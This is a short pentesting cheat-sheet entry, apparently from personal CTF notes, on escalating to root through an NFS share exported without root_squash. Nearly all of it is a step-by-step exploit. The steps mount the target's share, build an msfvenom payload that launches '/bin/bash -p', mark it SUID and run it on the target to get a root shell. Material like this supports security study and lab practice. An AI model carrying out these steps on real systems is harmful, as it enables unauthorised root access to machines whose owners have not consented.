### root_squash

Description: When disabled, it can allow the creation of SUID bit files

Exploitation: Copy a [bash](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash) file owned by root to the [[Linux/Enumeration/NFS|mounted NFS folder]], than run it with the -p flag to persist permissions

1. Check the NFS share configuration in the machine: `cat /etc/exports`
2. Create a folder in your machine to mount the share to: `mkdir /tmp/nfs`
3. Mount the folder: `mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
4. Generate a payload using msfvenom and save it to the mounted share: `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
5. Make the file executable with SUID permissions: `chmod +xs /tmp/nfs/shell.elf`
6. Execute the shell from the target machine: `/tmp/shell.elf`